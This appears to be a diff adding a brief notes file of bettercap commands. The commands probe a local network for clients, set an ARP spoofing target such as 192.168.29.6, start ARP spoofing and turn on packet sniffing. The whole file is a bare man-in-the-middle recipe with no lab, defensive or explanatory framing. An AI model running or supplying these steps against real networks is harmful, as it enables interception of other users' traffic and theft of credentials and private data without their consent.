@@ -1,0 +1,20 @@
+START
+
+bettercap -iface [interface]
+eg : bettercap -iface eth0
+
+net.probe on (get list of clients connected to network)
+
+
+SET ARP SPOOF TARGETS
+----------------------
+set arp.spoof.targets [target ip address]
+eg:- set arp.spoof.targets 192.168.29.6
+
+START ARP SPOOF
+--------------
+arp.spoof on
+
+START SNIFF
+-----------
+net.sniff on
